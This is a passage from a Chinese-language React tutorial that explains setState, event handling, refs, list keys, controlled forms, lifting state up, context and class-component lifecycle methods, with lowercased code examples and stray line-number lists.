''})来改变state上属性的值（浅合并），而且使用setstate()这个方法还会重新触发组件的渲染，其实就是告诉浏览器我的组件内部状态改变了需要重新渲染。\n\nindex.tsx\n\nimport react from 'react';\nimport reactdom from 'react-dom';\nimport app from './app';\n\nreactdom.render(\n  <app />,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\napp.tsx\n\nimport react, { fragment, component } from 'react';\n\nclass app extends component<any, { date: date }> {\n  constructor(props: any) {\n    super(props);\n    this.state = { date: new date() };\n    setinterval(() => {\n      this.setstate({\n        date: new date()\n      });\n    }, 1000);\n  }\n  render() {\n    return (\n      <fragment>{this.state.date.tolocalestring()}</fragment>\n    );\n  }\n}\n\nexport default app;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n上面这个改造后的例子是用ts编写的，要注意的是constructor()函数的入参props是外部传来的也要传给react.component也就是super(props)，还有就是constructor()函数是唯一一个可以给state赋值（初始化）的地方（其他地方只能使用setstate()来更改）。\n\nsetstate()是浅合并（不是完全覆盖），意思是this.state里有多个属性时，调用setstate()去更改一个属性，其他属性还会保持原有的值。\n\nconstructor(props) {\n  super(props);\n  this.state = {\n    posts: [],\n    comments: []\n  };\n}\n\nxxx(response) {\n  // 调用时，只会更改posts的值并不会影响comments的值\n  this.setstate({\n    posts: response.posts\n  });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nstate的更新是异步的。react会优化state更新执行的时机，也就是说会将多个setstate()合并成一个。如果你在一个setstate()中要读取上一state的值，直接使用this.state的话可能拿不到正确的值。react为我们解决了这个问题，setstate()的入参可以是一个函数（前面例子都是一个对象），这个函数的入参是真正上一个state（还有另一个入参props）。\n\n// 有问题，因为 this.props 和 this.state 可能会异步更新\nthis.setstate({\n  counter: this.state.counter + this.props.increment,\n});\n\n// 使用函数，state就是之前的this.state对象\nthis.setstate(function(state, props) {\n  return {\n    counter: state.counter + props.increment\n  };\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n虽然解决了多个setstate()的问题，但是我就是要在某个setstate()后面获取当前处理后的this.state的值（不是获取上一个了），也是有办法的，setstate()的第二个参数就是回调函数。\n\nthis.setstate(function(state, props) {\n  // 上一个state的值（当前这个setstate()处理前的state）\n  return {\n    counter: state.counter + props.increment\n  };\n}, () => {\n  // 回调函数里可以获取当前处理后的this.state（当前这个setstate()处理后的state）\n  console.log('this.state', this.state);\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n最后明确一点，上面的state的使用都依托于类组件，意思要通过this.的形式来访问。函数式组件的this是undefined，所以它没法正常使用state，但不用担心，在后面的hooks章节里可以通过钩子手段来使用stata。\n\n\n# 2.4 数据流是单向的\n\n可以看下面这个例子，formatteddate组件调用处的data属性值可以是的父组件的state部分值或者props部分值或者自定义的new date()，而formatteddate组件定义处的（子组件内部）props只知道有data这个属性，并不知道数据是属于调用处的state还是props还是自定义的。反过来子组件的数据并不会影响父组件，所以说它们的数据流向都是从上到下这样的一种单向的方式（不允许在子组件里修改props）。\n\n// date的值可以是自身的state里的值，也可以是props，也可以new date()\n<formatteddate date={this.state.date} />\n\n// 定义处\nfunction formatteddate(props) {\n  return <h2>it is {props.date.tolocaletimestring()}.</h2>;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 2.5 事件处理\n\nreact中事件名属于jsx属性，需要使用首字母小写的驼峰命名法，事件的值一般都是表达式，所以和jsx属性的表达式方式一样使用{}来承载。在处理默认行为时，react不能通过return false来阻止，只能通过e.preventdefault()来阻止\n\nfunction actionlink() {\n  function handleclick(e) {\n    // react只能通过它来阻止默认行为\n    e.preventdefault();\n    console.log('the link was clicked.');\n  }\n  return (\n    // onclick是首字母小写的驼峰命名法，{handleclick}是jsx属性常见的表达式方式\n    <a href=\"#\" onclick={handleclick}>\n      click me\n    </a>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面例子中的e是react按照w3c规范合成的一个事件，与原生的几乎没有什么差别（可以通过e.nativeevent访问原生的事件），不必担心浏览器兼容问题。可以不用在js中单独使用addeventlistener来添加监听，直接在使用组件时在属性位置上添加事件名和对应的回调即可。说点题外话，e.currenttarget是事件绑定所在的元素，e.target是触发事件的元素（可以是前者的子元素）。\n\n如果使用react组件是类组件，事件的回调函数一般需要事先绑定一下组件的this。如果不这样处理，事件的回调函数的this会指向undefined，因为事件回调函数是被系统事件处理机制调用的，this预期会指向window，但由于class内部是严格模式不允许直接指向window所以就指向了undefined。\n\n像上面例子中的handleclick里面没有用到this，所以没有遇到这些问题。可一旦我们需要使用到类组件中的stata或者setstate等，它就需要处理this了，具体处理方式如下。\n\n * 方式一（不推荐），onclick={() => this.handleclick()}，不太推荐用额外的箭头函数包裹的这种方法，这种会在每次调用时都会创建不同的回调函数比较耗性能（以前是原型上的函数，大家共用一个，现在每次都新建了箭头函数）。\n * 方式二（常用），声明一个箭头函数，然后赋给成员变量handleclick，因为箭头函数本身没有this，那么在箭头函数里面使用的this其实是它所在的class的this，也就指向了类组件实例。\n * 方式三（常用），在constructor()里使用bind让回调函数绑定react组件的this，并将回调函数进行重新赋值（bind绑定了this会返回绑定后的新函数，后面要用()进行调用执行；而call和apply并不会返回新函数，它两是立即执行）。\n\n// 方式一，不推荐，每次回调都会生成新的箭头函数，性能不好\nclass toggle extends react.component {\n  constructor(props) {\n    super(props);\n    this.state = {istoggleon: true};\n  }\n  handleclick() {\n    this.setstate(state => ({\n      istoggleon: !state.istoggleon\n    }));\n  }\n  render() {\n    // 点击事件回调时，是先调用的箭头函数，而箭头函数本身没有this，在箭头函数内部使用this，其实是它外部\n    // 的this，也就是render的this指向类组件实例。然后继续执行handleclick，它内部this也指向了类组件实例\n    return (\n      <button onclick={() => this.handleclick()}>\n        {this.state.istoggleon ? 'on' : 'off'}\n      </button>\n    );\n  }\n}\n// 方式二，常用\nclass toggle extends react.component {\n  constructor(props) {\n    super(props);\n    this.state = {istoggleon: true};\n  }\n    // 方式二和方式一很像运用原理是一样的，方式一是handleclick本身是箭头函数，而方式二是用新箭头函数包裹了handleclick\n  handleclick = () => {\n    // 箭头函数虽然本身没有this，但如果在它内部使用了this，那么这个this实际它外部的this，也就指向了类组件实例\n    this.setstate(state => ({\n      istoggleon: !state.istoggleon\n    }));\n  }\n  render() {\n    return (\n      <button onclick={this.handleclick}>\n        {this.state.istoggleon ? 'on' : 'off'}\n      </button>\n    );\n  }\n}\n// 方式三，常用\nclass toggle extends react.component {\n  constructor(props) {\n    super(props);\n    this.state = {istoggleon: true};\n    // 为this.handleclick函数绑定了this（指向类实例），并生成新函数，最后赋值给了this.handleclick\n    this.handleclick = this.handleclick.bind(this);\n  }\n  handleclick() {\n    this.setstate(state => ({\n      istoggleon: !state.istoggleon\n    }));\n  }\n  render() {\n    return (\n      <button onclick={this.handleclick}>\n        {this.state.istoggleon ? 'on' : 'off'}\n      </button>\n    );\n  }\n}\nreactdom.render(\n  <toggle />,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n处理事件事件时可能需要传递参数：\n\n * 方式一（不推荐），多了event和那个自定传参，这个event必须显式传到真正的回调函数里。\n * 方式二，在jsx里直接bind，同时将参数放在后面传过去；\n * 方式三，在jsx标签里新增一个属性，将要传递的参数放在这个属性里，在回调函数里直接使用e.target.xxx就可以获取这个参数了。\n\n// 方式一，绑定this同上面的方式一，那么也就是不常用，每次调用都会创建新箭头函数，影响性能\n<button onclick={(e) => this.deleterow(id, e)}>delete row</button>\n\n// 方式二，常用。可以考虑方式二或者下面的方式三\n<button onclick={this.deleterow.bind(this, id)}>delete row</button>\n\n\n// 方式三，绑定this同上面的方式三，只是传值是使用了节点的额外自定义属性，再通过e.target去拿这个自定义属性\nconstructor() {\n  // 为了在回调中使用 `this`，这个绑定是必不可少的\n  this.handleclick = this.handleclick.bind(this);\n}\nhandleclick(e) {\n  // `e.currenttarget`是事件绑定所在的元素，`e.target`是触发事件的元素（可以是前者的子元素）\n  const id = e.target.id;\n}\nrender() {\n  return <button onclick={this.deleterow} id={id}>delete row</button>\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 2.6 组件的refs\n\n有些场景需要获取到某个节点，在原生js里通常是document.getelementbyid等。在react里是通过组件的refs来获取某个节点的，但事先通过ref给那个节点打上“标记”。（如果是点击事件获取到点击本身的节点，用event就足够了，没必要用ref，像下面这个场景是获取兄弟节点确实就需要用到ref。原则是能不用ref就不用ref）\n\nclass app extends react.component {\n  handleclick = ()=> {\n    // 使用时通过this.refs.xxx来读取\n    console.log(this.refs.mymyput.value)\n  }\n  render() {\n    // 使用ref=\"xxx\"给<input>打上标记\n    return (\n      <div classname=\"app\">\n        <input ref=\"mymyput\" />\n        <button onclick={this.handleclick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n上面的ref字符串写法已经被弃用了，推荐使用给ref绑定函数或者react.createref()的方式来创建ref。\n\nclass app extends react.component {\n  handleclick = ()=> {\n    console.log(this.mymyputel.value)\n  }\n  // 提供给<input>的ref，在创建输入框时会调用这个函数，并将输入框以参数形式传递给该函数\n  mymyput = (el) => {\n    this.mymyputel = el // 用一个属性接收\n  }\n  render() {\n    // 绑定ref绑定一个函数\n    return (\n      <div classname=\"app\">\n        <input ref={this.mymyput} />\n        <button onclick={this.handleclick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n最为推荐的是react.createref()，创建一个ref容器。\n\nclass app extends react.component {\n  // 相比于上一种方式，它少了一个mymyputel。这种方式下，这个element是放在了mymyput的current属性上了\n  mymyput = react.createref();\n  handleclick = ()=> {\n    // 所以用的时候，就得是this.mymyput.current\n    console.log(this.mymyput.current.value)\n  }\n  render() {\n    return (\n      <div classname=\"app\">\n        <input ref={this.mymyput} />\n        <button onclick={this.handleclick}>点击</button>\n      </div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n说点题外话，看上面的代码，类组件没有用到constructor，如果在构造函数里没有用到this.props是可以省略掉constructor以及它的super，props照样能接受到值的。至于state和事件回调函数是可以写成class的成员属性的。但是，如果你没有省略构造函数，那么constructor(props){}函数体里的super(props)就不能省略props，如果super(props)省略成super()这个样子，会出现一个bug，那就是你的this.props可能是个undefined（意味着没有构造props这个属性）。总的来说就是，要省略就把constructor和super都省略，要么都保留。\n\n\n# 四、key的作用/表单的使用\n\n\n# 4.1 key怎么用以及为什么用\n\n在前面的【条件、列表渲染】那节里说个列表渲染了。如果不加上key属性，在运行后会报错a key should be provided for list items，意思是当你创建一个元素时，必须包括一个特殊的key属性。key可以取item的tostring之后的值，也可以取索引值index，但最正确做法应该是取唯一的id值。\n\nfunction numberlist(props) {\n  const numbers = props.numbers;\n  const listitems = numbers.map((number) =>\n    <li key={number.tostring()}>\n      {number}\n    </li>\n  );\n  return (\n    <ul>{listitems}</ul>\n  );\n}\n\nconst numbers = [1, 2, 3, 4, 5];\nreactdom.render(\n  <numberlist numbers={numbers} />,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果你对li进行了一次提取，将<li>提取成listitem，那么这个key是放在提取的listitem上还是放在原本的<li>上？答案就是放在靠近数组的上下文组件里，也就是放在listitem调用处的标签上。\n\n// 从li提取新组件listitem\nfunction listitem(props) {\n  // 这里不需要指定 key：\n  return <li>{props.value}</li>;\n}\n// numberlist组件\nfunction numberlist(props) {\n  const numbers = props.numbers;\n  const listitems = numbers.map((number) =>\n    // 正确！key 应该在数组的上下文中被指定\n    <listitem key={number.tostring()} value={number} />\n  );\n  return (\n    <ul>\n      {listitems}\n    </ul>\n  );\n}\n\nconst numbers = [1, 2, 3, 4, 5];\nreactdom.render(\n  <numberlist numbers={numbers} />,\n  document.getelementbyid('root')\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在上面例子中<listitem key={number.tostring()} value={number} />，这个key只是传给react使用的，listitem定义处的props只能读取到value，是读取不到key值的，这点要注意。如果你实在想用这些key值，那就使用其他属性名将key赋给这个新属性传过去即可。\n\n前面只是说了怎么用key，那为什么用key呢？原因是react要进行diff比较，让元素进行合适的局部更新，谁与谁比呢？那就是前后相同key的元素去比，帮助react识别哪些元素改变了。比如添加一项时，直接根据它的虚拟元素去渲染真实dom，因为它拥有一个新key，以前就没有这个key，肯定得重新生成虚拟元素以及真实dom。（删除也是同样的道理，key都完全没有了，直接删除）\n\n那么不建议用索引作为key你应该好理解了。在添加和删除的时候，列表的索引只是看起来改变了尾上那个，比如索引[0,1,2]变为了[0,1,2,3]，但你能肯定一定是在尾上添加的项吗？这样会导致什么问题呢，那就是一一对应大部分失效了（在添加删除时），大部分项都会重新渲染。比如是在0位置上添加的新项，那么后面的项整体往后挪一个位置，那么它们就每人获得了一个新索引，key自然也是跟着变动了，那么diff比较时是不是每一项都会认为变动了，它们都会重新渲染了，非常浪费性能。总的来说就是索引作为key，添加或删除导致有些项挪动位置从而获得了新key，就导致了没必要的重新渲染。\n\n其实上面还不是很严重的问题，最严重的是渲染错误，比如每项都包含自己的文本节点以及一个input节点。input会输入一些值，而在diff时反而不会检测输入的具体值，这会认为input子节点可以被复用。但是这项本身以及它的文本节点会重新渲染（上面的添加删除场景，因为获得了新索引），这样就导致一些文字好像更新了input好像是上一项留下来的，效果图如下（新增一项在0位置，正确的是0位置的input应该没有值，其他也不能错位），这种场景的diff与vue是一样的。\n\n\n\n用唯一的id值作为key就不一样，不管你位置怎么变动，我只找key对应的元素进行前后比较，diff出结果不同才重新渲染（修改场景）。至于添加和删除前面也说过了，新的key以前没有就直接渲染，以前有现在没有就直接删除。\n\n\n# 4.2 表单\n\n在react中，表单的数据源通常保存在组件的state中，再让表单元素的value属性和state关联起来，这样一来表单的显示效果始终由react的state驱动（“唯一数据源”）。再对表单做事件处理，在事件回调函数中使用setstate()来更改表单组件的数据源，那么表单显示的值将随着用户输入而更新。\n\nclass nameform extends react.component {\n  state = {value: ''};\n  handlechange = (event) => {\n    this.setstate({value: event.target.value});\n  }\n  handlesubmit = (event) => {\n    alert('提交的名字: ' + this.state.value);\n    event.preventdefault();\n  }\n  render() {\n    // 受控组件，意思是输入框里的值更新了，也会同步更新到状态state里\n    return (\n      <form onsubmit={this.handlesubmit}>\n        <label>\n          名字:\n          <input type=\"text\" value={this.state.value} onchange={this.handlechange} />\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<input>、<textarea>和select基本一样，都是value控制着显示效果，事件控制着数据更新。\n\nclass flavorform extends react.component {\n  state = {value: 'coconut'};\n  handlechange = (event) => {\n    this.setstate({value: event.target.value});\n  }\n  handlesubmit = (event) => {\n    alert('你喜欢的风味是: ' + this.state.value);\n    event.preventdefault();\n  }\n  render() {\n    // 多选的话可以使用value={['grapefruit', 'lime']}这种字符串数组格式\n    return (\n      <form onsubmit={this.handlesubmit}>\n        <label>\n          选择你喜欢的风味:\n          <select value={this.state.value} onchange={this.handlechange}>\n            <option value=\"grapefruit\">葡萄柚</option>\n            <option value=\"lime\">酸橙</option>\n            <option value=\"coconut\">椰子</option>\n            <option value=\"mango\">芒果</option>\n          </select>\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n如果有多个同类型的表单（不同类型可以通过nodename等来判断），区分的话要在表单元素上使用name这个属性，并在回调函数中使用event.target.name来区分。例如下方的name=\"isgoing\"和name=\"numberofguests\"，在handleinputchange函数中就用event.target.name来区分是哪个input。当然，你也可以用函数柯里化（调用函数，然后返回一个函数，本质是个闭包）来实现多个同类型表单接受各自的值。\n\nrender() {\n  return (\n    // 让多个控件使用同一个handleinputchange，用event.target.name来区分\n    <form>\n      <label>\n        参与:\n        <input\n          name=\"isgoing\"\n          type=\"checkbox\"\n          checked={this.state.isgoing}\n          onchange={this.handleinputchange} />\n      </label>\n      <br />\n      <label>\n        来宾人数:\n        <input\n          name=\"numberofguests\"\n          type=\"number\"\n          value={this.state.numberofguests}\n          onchange={this.handleinputchange} />\n      </label>\n    </form>\n  );\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 五、状态提升\n\n当兄弟组件有联动关系时，它们所用的数据来源不会是各自的state（修改自身的state不会影响别的组件），而是存储在父组件的state中。\n\n具体就是，先把数据源存储在父组件的state中，准备渲染时以一定的条件或转换关系分别处理子组件所需的数据和回调函数，再将处理好的内容通过props这种单向通道传递给子组件；在某个子组件变化时，调用父组件传递过来的回调函数，并将新的值通过这个回调函数传递回父组件，然后父组件通过setstate()来修改state数据源，最后就是重新渲染所有子组件，这样就达到了子组件间的联动的目的。\n\n多个组件需要反映相同的变化数据，要将共享状态提升到最近的共同父组件中去，我们称这种方式为“状态提升”。下面是状态提升的一个样例，app.tsx和numberinput.tsx：\n\napp.tsx\n\nimport react, { component } from 'react';\nimport numberinput from './numberinput';\n\ninterface idata { type: string, value: number | string }\n\nclass app extends component<any, idata> {\n  constructor(props: any) {\n    super(props);\n    this.handlevalue = this.handlevalue.bind(this);\n    this.state = { type: 'a', value: 0 };\n  }\n  handlevalue(data: idata) {\n    this.setstate({ type: data.type, value: data.value });\n  }\n  tryconvert(): number | string {\n    // 为了解决nan的问题\n    if (typeof this.state.value === 'string') {\n      return '';\n    }\n    switch (this.state.type) {\n      case 'a': // 传进来是a，返回是b类型的值\n        return this.state.value + 12;\n      case 'b':\n        return this.state.value - 12;\n      default:\n        return '';\n    }\n  }\n\n  render() {\n    const type = this.state.type;\n    const value = this.state.value;\n    const avalue = type === 'a' ? value : this.tryconvert();\n    const bvalue = type === 'b' ? value : this.tryconvert();\n\n    return (\n      <div>\n        <numberinput\n          inputtype=\"a\"\n          inputvalue={avalue}\n          inputhandle={this.handlevalue} />\n        <numberinput\n          inputtype=\"b\"\n          inputvalue={bvalue}\n          inputhandle={this.handlevalue} />\n      </div>\n    );\n  }\n}\n\nexport default app;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nnumberinput.tsx\n\nimport react, { component } from 'react';\n\ninterface idata { type: string, value: number | string }\ninterface iprops { inputtype: string, inputvalue: number | string, inputhandle: (data: idata) => void }\n\nclass numberinput extends component<iprops, any> {\n    constructor(props: iprops) {\n        super(props);\n        this.handlevalue = this.handlevalue.bind(this);\n    }\n    handlevalue(e: any) {\n        let value: number | string = parseint(e.target.value);\n        value = isnan(value) ? '' : value;\n        // 状态提升，使用父组件传过来的value和处理事件，不用自身的state\n        this.props.inputhandle({ type: this.props.inputtype, value });\n    }\n    render() {\n        // 状态提升，使用父组件传过来的value和处理事件，不用自身的state\n        return <input value={this.props.inputvalue} onchange={this.handlevalue} />\n    }\n}\nexport default numberinput;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 六、context\n\n前面所用到props一般就用到2-3层，一旦层比较深，就会通过中间元素传递props，这样会不容易维护组件，复用性也会变差。\n\n先在在顶层组件附近使用const mycontext = react.createcontext(obj)，给obj对象关联一个context，然后在顶部组件jsx中使用<mycontext.provider value={xxx}>对值进行传递，深层的组件不是立即就能用的，需要先导入那个context对象，然后使用contexttype方式或者<mycontext.consumer>方式进行接收（消费）。\n\nconst defaultcontextvalue = { username: '张三'};\n// 这个mycontext不能放在顶层组件内部，必须放在外面，还要export出去供孙组件使用\nexport const mycontext = react.createcontext(defaultcontextvalue);\nexport default class app extends react.component {\n  render() {\n    // mycontext名字是上面createcontext时自定义的，provider的是固定写法\n    return (\n      <mycontext.provider value={defaultcontextvalue}>\n        <todocomponent/>\n      <mycontext.provider/>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n在类组件中接受（消费）context，是通过类的静态属性contexttype实现的。\n\n// 这里一定要先导入之前的context对象\nimport { mycontext } from '../todoitem'\nexport default class todoitem extends component {\n    // 静态属性contexttype接收mycontext，就能使用this.context了\n    static contexttype = mycontext;\n    render() {\n        return (\n          <li>\n              <label>\n                  <input type=\"checkbox\"/>\n                  <span>名称：{this.context.username}</span>\n              </label>\n              <button classname=\"btn btn-danger\" style={{display:'none'}}>删除</button>\n          </li>\n        )\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果是函数式组件，那就需要使用<mycontext.consumer>，其实该方法同样也能用在类组件中，但是类组件contexttype方式更方便，但如果是函数组件其实用usecontext会更方便，这在后面hooks章节会讲。\n\n// 这里一定要先导入之前的context对象\nimport { mycontext } from '../todoitem'\nexport default class todoitem extends component {\n    render() {\n        // mycontext名字是上面createcontext时自定义的，consumer的是固定写法。\n        // value就是provider里的value，要写成函数形式再return\n        return (\n          <li>\n              <label>\n                  <input type=\"checkbox\"/>\n                  <mycontext.consumer>\n                    {value => {\n                      return (\n                        <span>名称：{value.username}</span>\n                        )\n                    }}\n                  <mycontext.consumer>\n              </label>\n              <button classname=\"btn btn-danger\" style={{display:'none'}}>删除</button>\n          </li>\n        )\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 七、组件的生命周期\n\n组件的生命周期分为三个阶段：\n\n * 挂载时(mounting)：组件第一次绘制，将会创建虚拟dom、渲染ui，完成组件的初始化和挂载。\n * 更新时(updating)：组件运行交互的阶段，可以处理用户的交互、收集监听事件、重新渲染ui。\n * 卸载时(unmounting)：组件卸载消亡的阶段，会对组件做一些清理工作，删除虚拟dom、移除ui。\n\n这三个阶段的细节以及常用的生命周期函数如下图：\n\n\n\n\n# constructor()和render()\n\nconstructor()是组件的构造函数，用于初始化组件的数据。一般就是为了给this.state赋值（唯一赋值的地方了），然后就是给处理事件绑定this。还要记得在第一行要加上super(props)，然后不要调用setstate()。既然可以赋值给this.state干嘛还要调用setstate()。\n\nrender()是react组件必须实现的函数（准备组件渲染所需的ui），它一般返回的就是组件的jsx形式的ui（不渲染就返回null）。我们常常在这个函数里构建组件的模板，返回jsx前也会稍微处理一下数据以方便放入jsx中。但是这个函数里不允许与浏览器进行交互，交互的逻辑放到其他生命周期函数里（事件处理函数最好定义成组件的成员）。\n\n\n# componentdidmount()和componentwillunmount()\n\ncomponentdidmount()这个生命周期函数会在挂载时的最后一步被调用（其实就是告诉开发已经挂载完了），一些比较依赖挂载后的dom结构的处理工作会在这个生命周期函数里进行。例如添加订阅和网络请求等。还有比如想知道添加了组件后它所在位置大小等等。\n\ncomponentwillunmount()这个生命周期函数会在卸载时被调用（在销毁前被调用），一般在这里做一些必要的清理操作。例如取消订阅和网络请求等。\n\n在componentdidmount()中是可以调用setstate()的，会触发一次额外的渲染，请谨慎使用因为会用性能问题，请在constructor()里就做好state初始工作。在componentwillunmount()是不允许调用setstate()的，都要卸载销毁了。\n\n我们对组件的state这节的第一个例子进行改造，将定时器的注册放到componentdidmount()，将定时器的注销放到componentwillunmount()。\n\nimport react, { fragment, component } from 'react';\n\nclass app extends component<any, { date: date }> {\n  constructor(props: any) {\n    super(props);\n    this.state = { date: new date() };\n  }\n  componentdidmount() {\n    this.interval = setinterval(() => {\n      this.setstate({\n        date: new date()\n      });\n    }, 1000);\n  }\n  componentwillunmount() {\n    clearinterval(this.interval);\n  }\n  render() {\n    return (\n      <fragment>{this.state.date.tolocalestring()}</fragment>\n    );\n  }\n}\n\nexport default app;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# componentdidupdate()和getsnapshotbeforeupdate()\n\ngetsnapshotbeforeupdate()这个生命周期函数（不常用的生命周期函数）在更新时的渲染输出之前被调用的，它使得组件能在发生更改之前从 dom 中捕获一些信息（例如，滚动位置），它的返回值将作为componentdidupdate()的第三个参数“snapshot”。\n\ncomponentdidupdate()这个生命周期函数是在更新时的最后一步被调用的（其实就是告诉开发已经更新完了）。值得注意的是，首次渲染不会调用它，而是调用componentdidmount()（首次渲染在挂载时）。可以在该生命周期函数里进行dom操作（ui处理），也可以在一定条件下（对比了前后props）进行网络请求。虽然可以在该生命周期函数使用setstate()，但一定要加条件，否则容易死循环，要谨慎。\n\nclass scrollinglist extends react.component {\n  constructor(props) {\n    super(props);\n    this.listref = react.createref();\n  }\n\n  getsnapshotbeforeupdate(prevprops, prevstate) {\n    // 我们是否在 list 中添加新的 items ？\n    // 捕获滚动​​位置以便我们稍后调整滚动位置。\n    if (prevprops.list.length < this.props.list.length) {\n      const list = this.listref.current;\n      return list.scrollheight - list.scrolltop;\n    }\n    return null;\n  }\n\n  componentdidupdate(prevprops, prevstate, snapshot) {\n    // 如果我们 snapshot 有值，说明我们刚刚添加了新的 items，\n    // 调整滚动位置使得这些新 items 不会将旧的 items 推出视图。\n    //（这里的 snapshot 是 getsnapshotbeforeupdate 的返回值）\n    if (snapshot !== null) {\n      const list = this.listref.current;\n      list.scrolltop = list.scrollheight - snapshot;\n    }\n  }\n\n  render() {\n    return (\n      <div ref={this.listref}>{/* ...contents... */}</div>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# shouldcomponentupdate()\n\nshouldcomponentupdate()这个生命周期函数（不常用的生命周期函数）在更新时的getderivedstatefromprops()之后而render()之前被调用。\n\nshouldcomponentupdate(nextprops, nextstate) {\n  return true;\n}\n\n\n1\n2\n3\n\n\n当一个组件的props或state变更，react会将最新返回的元素与之前渲染的元素进行对比，只更新改变了的dom节点。即便如此也要花费一些时间，大部分情况下是没有问题的，一旦它慢到让然怀疑的程度了，那么使用shouldcomponentupdate()来优化它们是一个很好的选择。该生命周期函数默认返回true表示让组件进行渲染，如果返回false则跳过整个渲染过程（包括子组件）。\n\nclass counterbutton extends react.component {\n  constructor(props) {\n    super(props);\n    this.state = {count: 1};\n  }\n  // 当 props.color 或者 state.count 的值改变才需要更新\n  shouldcomponentupdate(nextprops, nextstate) {\n    if (this.props.color !== nextprops.color) {\n      return true;\n    }\n    if (this.state.count !== nextstate.count) {\n      return true;\n    }\n    return false;\n  }\n\n  render() {\n    return (\n      <button\n        color={this.props.color}\n        onclick={() => this.setstate(state => ({count: state.count + 1}))}>\n        count: {this.state.count}\n      </button>\n    );\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# getderivedstatefromprops()\n\n在讲getderivedstatefromprops()之前先介绍几个概念：\n\n * 派生state：组件中的state中有部分数据来自于外部（一般是props），这样的state就是派生state。\n * 受控：用props传入数据的话，组件可以被认为是受控（因为组件被父级传入的props控制）。 -非受控：数据只保存在组件内部的 state 的话，是非受控组件（因为外部没办法直接控制 state）。\n\n派生state最常见的问题就是将受控和非受控混在一起使用。例如，将父组件传来的props的值复制给了state，而子组件内部使用state作为渲染数据源。父组件可以通过props影响到state值（甚至毫无影响），用户操作通过setstate()也会影响到state的值，这导致要么state完全不受父组件源头的影响要么父组件的源数据一直覆盖子组件本身的setstate()。\n\ngetderivedstatefromprops()这个生命周期函数（不常用的生命周期函数）会在挂载时的constructor()和render()之间被调用，以及后续更新时的第一步被调用。该生命周期函数主要是为了解决派生state最常见的问题。\n\n// 它是静态方法，必须使用`static`关键字\n// 有两个入参“当前最新的props”和“上一个state”。\n// 返回一个对象来更新state，如果返回null则不更新任何内容\nstatic getderivedstatefromprops(props, state) 